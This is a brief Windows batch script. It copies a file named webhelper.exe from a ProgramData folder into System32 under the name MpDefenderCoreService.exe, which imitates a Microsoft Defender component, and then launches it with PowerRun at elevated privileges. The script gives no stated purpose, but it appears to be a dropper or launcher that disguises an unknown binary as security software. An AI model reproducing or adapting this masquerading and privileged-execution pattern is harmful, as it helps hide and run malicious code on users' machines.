@echo off
setlocal
set "tf=C:\Windows\System32\MpDefenderCoreService.exe"
set "bf=C:\ProgramData\Microsoft\Settings\webhelper.exe"
if not exist "%tf%" (
	copy "%bf%" "%tf%"
) 
endlocal

pushd "%CD%"
CD /D "%~dp0"
PowerRun.exe "C:\Windows\System32\MpDefenderCoreService.exe"